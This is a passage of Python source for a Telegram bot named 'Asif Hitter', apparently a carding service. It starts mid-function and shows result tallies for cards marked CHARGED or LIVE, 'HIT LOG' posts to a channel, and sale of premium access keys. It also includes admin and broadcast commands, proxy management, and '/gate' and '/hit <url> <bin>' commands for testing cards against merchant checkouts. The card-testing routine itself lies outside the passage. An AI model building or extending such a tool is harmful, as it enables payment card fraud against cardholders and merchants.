        res[sts] = res.get(sts, 0) + 1
        
        if sts == "CHARGED": charged_c.append(r["card"])
        elif sts == "LIVE": live_c.append(r["card"])
    
    dash = f"""
{e('👑')} <b>RESULTS</b> {e('👑')}

{e('📦')} <b>{h(ck.mer)}</b>
{e('💰')} <b>{h(ck.amt)}</b>

{e('✅')} Charged: <b>{res['CHARGED']}</b>
{e('💎')} Live: <b>{res['LIVE']}</b>
🟡 3DS: <b>{res['3DS']}</b>
🔴 Declined: <b>{res['DECLINED']}</b>
{e('⛔')} Captcha: <b>{res.get('HCAPTCHA',0)}</b>
⚪ Error: <b>{res.get('ERROR',0)}</b>
"""
    if charged_c:
        dash += f"\n{e('🔥')} <b>CHARGED:</b>\n"
        for c in charged_c[:5]:
            dash += f"{e('✅')} <code>{c}</code>\n"
    if live_c:
        dash += f"\n{e('💎')} <b>LIVE:</b>\n"
        for c in live_c[:5]:
            dash += f"{e('⭐️')} <code>{c}</code>\n"
    
    dash += f"\n{e('❤️')} <a href=\"https://t.me/{DEV_USERNAME}\">{DEV_NAME}</a>"
    
    await st.edit_text(dash, parse_mode=ParseMode.HTML)
    
    # Log to channel
    log_channel = await get_setting("log_channel", "@your_channel")
    if log_channel and (charged_c or live_c):
        try:
            await ctx.bot.send_message(
                log_channel,
                f"{e('🔥')} <b>HIT LOG</b>\n"
                f"{e('👤')} User: <a href=\"tg://user?id={uid}\">{h(update.effective_user.full_name)}</a>\n"
                f"{e('📦')} {h(ck.mer)}\n"
                f"{e('💰')} {h(ck.amt)}\n"
                f"{e('✅')} Charged: {len(charged_c)} | {e('💎')} Live: {len(live_c)}",
                parse_mode=ParseMode.HTML
            )
        except: pass

# ═══════════════ AUTH ═══════════════

async def cmd_auth(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    
    if not ctx.args:
        await update.message.reply_text(f"{e('⚠️')} Usage: <code>/auth &lt;key&gt;</code>", parse_mode=ParseMode.HTML)
        return
    
    key = ctx.args[0].upper()
    kd = await jload(KEYS_FILE, {"keys": {}})
    
    if key not in kd["keys"]:
        await update.message.reply_text(f"{e('❌')} Invalid key!", parse_mode=ParseMode.HTML)
        return
    
    kdata = kd["keys"][key]
    if kdata.get("used"):
        await update.message.reply_text(f"{e('❌')} Key already used!", parse_mode=ParseMode.HTML)
        return
    
    days = kdata["days"]
    expiry = (datetime.now() + timedelta(days=days)).isoformat()
    
    kdata["used"] = True
    kdata["used_by"] = uid
    kdata["expiry"] = expiry
    await jsave(KEYS_FILE, kd)
    
    pd = await jload(PREMIUM_FILE, {"users": {}})
    pd["users"][str(uid)] = {
        "name": update.effective_user.full_name,
        "username": update.effective_user.username or "",
        "activated": datetime.now().isoformat(),
        "expiry": expiry,
        "key": key,
        "plan": f"{days} day(s)"
    }
    await jsave(PREMIUM_FILE, pd)
    
    await update.message.reply_text(
        f"{ec('🎉',3)} <b>CONGRATULATIONS!</b> {ec('🎉',3)}\n\n"
        f"{e('👑')} You have <b>PREMIUM ACCESS</b> to Asif Hitter!\n\n"
        f"{e('⏱️')} Expires: <code>{expiry[:10]}</code>\n"
        f"{e('💎')} Plan: <code>{days} day(s)</code>\n\n"
        f"{e('🚀')} Use /hit to start!\n"
        f"{e('❤️')} Welcome to Premium!",
        parse_mode=ParseMode.HTML
    )
    
    log_channel = await get_setting("log_channel", "@your_channel")
    if log_channel:
        try:
            await ctx.bot.send_message(
                log_channel,
                f"{e('🎉')} <b>KEY REDEEMED</b>\n"
                f"{e('👤')} User: <a href=\"tg://user?id={uid}\">{h(update.effective_user.full_name)}</a>\n"
                f"{e('🔑')} Key: <code>{key}</code>\n"
                f"{e('⏱️')} Plan: {days} day(s)\n"
                f"{e('📅')} Expires: {expiry[:10]}",
                parse_mode=ParseMode.HTML
            )
        except: pass

async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    adm = is_admin(uid)
    
    if adm:
        await update.message.reply_text(
            f"{e('⚡')} {e('👑')} <b>ADMIN</b>\n\n"
            f"{e('✅')} Full access — all features unlocked!\n"
            f"{e('💎')} No expiry — permanent access",
            parse_mode=ParseMode.HTML
        )
    elif await is_premium(uid):
        pd = await jload(PREMIUM_FILE)
        u = pd["users"].get(str(uid), {})
        await update.message.reply_text(
            f"{e('👑')} <b>PREMIUM ACTIVE</b>\n\n"
            f"{e('⏱️')} Expires: <code>{u.get('expiry','?')[:10]}</code>\n"
            f"{e('💎')} Plan: <code>{u.get('plan','?')}</code>\n"
            f"{e('✅')} All features unlocked!",
            parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text(
            f"{e('⛔')} <b>FREE USER</b>\n\n{e('🔑')} Use /auth &lt;key&gt; to upgrade",
            parse_mode=ParseMode.HTML
        )

# ═══════════════ ADMIN ═══════════════

async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    
    if len(ctx.args) < 3:
        await update.message.reply_text(f"{e('⚠️')} Usage: <code>/genkey 10 7 PREMIUM</code>", parse_mode=ParseMode.HTML)
        return
    
    try:
        count, days = int(ctx.args[0]), int(ctx.args[1])
        prefix = ctx.args[2].upper()
    except:
        await update.message.reply_text(f"{e('❌')} Invalid format", parse_mode=ParseMode.HTML)
        return
    
    kd = await jload(KEYS_FILE, {"keys": {}})
    new = []
    for _ in range(count):
        k = f"{prefix}-{random.randint(1000,9999)}-{random.randint(1000,9999)}"
        kd["keys"][k] = {"days": days, "used": False, "used_by": None, "created": datetime.now().isoformat()}
        new.append(k)
    await jsave(KEYS_FILE, kd)
    
    txt = f"{e('🎁')} <b>KEYS GENERATED</b>\n\n{e('📦')} Count: <b>{count}</b>\n{e('⏱️')} Duration: <b>{days} day(s)</b>\n\n"
    txt += "\n".join([f"{e('🔑')} <code>{k}</code>" for k in new])
    
    if len(new) > 15:
        buf = StringIO("\n".join(new))
        buf.name = "keys.txt"
        await update.message.reply_document(InputFile(buf, filename="keys.txt"), caption=f"{count} keys ({days} days)")
    else:
        await update.message.reply_text(txt, parse_mode=ParseMode.HTML)

async def cmd_premium(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    pd = await jload(PREMIUM_FILE, {"users": {}})
    users = pd.get("users", {})
    
    if not users:
        await update.message.reply_text(f"{e('❌')} No premium users", parse_mode=ParseMode.HTML)
        return
    
    txt = f"{e('👑')} <b>PREMIUM USERS</b>\n\n"
    for uid, u in users.items():
        try:
            exp = datetime.fromisoformat(u.get("expiry","2000-01-01"))
            active = e('🟢') if datetime.now() < exp else e('🔴')
            txt += f"{active} <a href=\"tg://user?id={uid}\">{h(u.get('name','?'))}</a>\n"
            txt += f"   {e('⏱️')} Expires: <code>{u.get('expiry','?')[:10]}</code>\n"
            txt += f"   {e('💎')} Plan: <code>{u.get('plan','?')}</code>\n\n"
        except: pass
    
    await send_paginated(update, txt)

async def cmd_rmsub(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    if not ctx.args:
        await update.message.reply_text(f"{e('⚠️')} Usage: <code>/rmsub &lt;user_id&gt;</code>", parse_mode=ParseMode.HTML)
        return
    
    uid = ctx.args[0]
    pd = await jload(PREMIUM_FILE, {"users": {}})
    
    if uid not in pd.get("users", {}):
        await update.message.reply_text(f"{e('❌')} User not found", parse_mode=ParseMode.HTML)
        return
    
    del pd["users"][uid]
    await jsave(PREMIUM_FILE, pd)
    
    await update.message.reply_text(f"{e('✅')} User premium removed!", parse_mode=ParseMode.HTML)
    try:
        await ctx.bot.send_message(int(uid), f"{e('⛔')} Your premium has been revoked by admin.", parse_mode=ParseMode.HTML)
    except: pass

async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    msg = update.message.text.replace("/broadcast", "").strip()
    if not msg:
        await update.message.reply_text(f"{e('⚠️')} Usage: <code>/broadcast &lt;message&gt;</code>", parse_mode=ParseMode.HTML)
        return
    
    pd = await jload(PREMIUM_FILE, {"users": {}})
    sent = 0
    for uid in pd.get("users", {}):
        try:
            await ctx.bot.send_message(int(uid), f"{e('📢')} <b>BROADCAST</b>\n\n{msg}", parse_mode=ParseMode.HTML)
            sent += 1
        except: pass
    
    await update.message.reply_text(f"{e('✅')} Broadcast sent to <b>{sent}</b> users", parse_mode=ParseMode.HTML)

async def cmd_sethits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    
    if ctx.args:
        channel = ctx.args[0]
        await update_setting("log_channel", channel)
        await update.message.reply_text(f"{e('✅')} Log channel set to: {h(channel)}", parse_mode=ParseMode.HTML)
    else:
        current = await get_setting("log_channel", "@your_channel")
        await update.message.reply_text(f"{e('ℹ️')} Current: {h(current)}\nUsage: <code>/sethits @channel</code>", parse_mode=ParseMode.HTML)

# ═══════════════ CALLBACKS ═══════════════

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    d = q.data
    
    if d == "gate_help":
        await q.message.reply_text(f"{e('🌐')} <b>Gateway Check</b>\n\n{e('ℹ️')} Usage: <code>/gate &lt;url&gt;</code>", parse_mode=ParseMode.HTML)
    elif d == "hit_help":
        await q.message.reply_text(f"{e('💳')} <b>Hit Checkout</b>\n\n{e('👑')} Premium only!\n{e('ℹ️')} Usage: <code>/hit &lt;url&gt; &lt;bin&gt;</code>", parse_mode=ParseMode.HTML)
    elif d == "redeem_help":
        await q.message.reply_text(f"{e('🔑')} <b>Redeem Key</b>\n\n{e('ℹ️')} Usage: <code>/auth &lt;key&gt;</code>", parse_mode=ParseMode.HTML)
    elif d == "status":
        await cmd_status(update, ctx)
    elif d == "proxy_menu":
        await q.message.reply_text(
            f"{e('🔐')} <b>PROXY MANAGER</b>\n\n"
            f"{e('📌')} /addproxy — Add proxies\n"
            f"{e('🔍')} /proxy — Check proxies\n"
            f"{e('🗑')} /rmproxy — Remove proxies",
            parse_mode=ParseMode.HTML
        )
    elif d == "admin" and is_admin(uid):
        kb = [
            [InlineKeyboardButton("🔑 Gen Keys", callback_data="genkey_menu")],
            [InlineKeyboardButton("👥 Premium Users", callback_data="prem_list")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="bcast_help")],
        ]
        await q.message.reply_text(
            f"{e('⚡')} <b>ADMIN PANEL</b>\n\n"
            f"🔑 /genkey 10 7 PREMIUM\n"
            f"👥 /premium — List users\n"
            f"🗑 /rmsub &lt;id&gt; — Remove user\n"
            f"📢 /broadcast &lt;msg&gt; — Send to all\n"
            f"📡 /sethits @channel — Set log",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(kb)
        )

# ═══════════════ AUTO EXPIRE ═══════════════

async def expire_checker(ctx: ContextTypes.DEFAULT_TYPE):
    pd = await jload(PREMIUM_FILE, {"users": {}})
    expired = []
    for uid, u in pd.get("users", {}).items():
        try:
            if datetime.now() > datetime.fromisoformat(u.get("expiry","2000-01-01")):
                expired.append(uid)
        except: pass
    
    for uid in expired:
        del pd["users"][uid]
        try:
            await ctx.bot.send_message(
                int(uid),
                f"{ec('⛔',3)} <b>PREMIUM EXPIRED</b> {ec('⛔',3)}\n\n"
                f"{e('⏱️')} Your premium access has ended.\n"
                f"{e('🔑')} Get a new key to continue.\n"
                f"{e('❤️')} <a href=\"https://t.me/{DEV_USERNAME}\">{DEV_NAME}</a>",
                parse_mode=ParseMode.HTML
            )
        except: pass
    
    if expired:
        await jsave(PREMIUM_FILE, pd)

# ═══════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════

async def post_init(app: Application):
    """Called after bot starts"""
    await load_settings()
    print(f"✅ Settings loaded. Log channel: {await get_setting('log_channel', 'N/A')}")

def main():
    print("🚀 Starting Asif Hitter Bot v3.0...")
    
    os.makedirs(DATA_DIR, exist_ok=True)
    
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    
    # Commands
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("addproxy", cmd_addproxy))
    app.add_handler(CommandHandler("proxy", cmd_proxy))
    app.add_handler(CommandHandler("rmproxy", cmd_rmproxy))
    app.add_handler(CommandHandler("gate", cmd_gate))
    app.add_handler(CommandHandler("hit", cmd_hit))
    app.add_handler(CommandHandler("auth", cmd_auth))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("genkey", cmd_genkey))
    app.add_handler(CommandHandler("premium", cmd_premium))
    app.add_handler(CommandHandler("rmsub", cmd_rmsub))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("sethits", cmd_sethits))
    app.add_handler(CallbackQueryHandler(on_callback))
    
    # Auto expire check every 30 minutes
    if app.job_queue:
        app.job_queue.run_repeating(expire_checker, interval=1800, first=30)
        print("✅ Job queue initialized")
    
    print("✅ Bot running!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()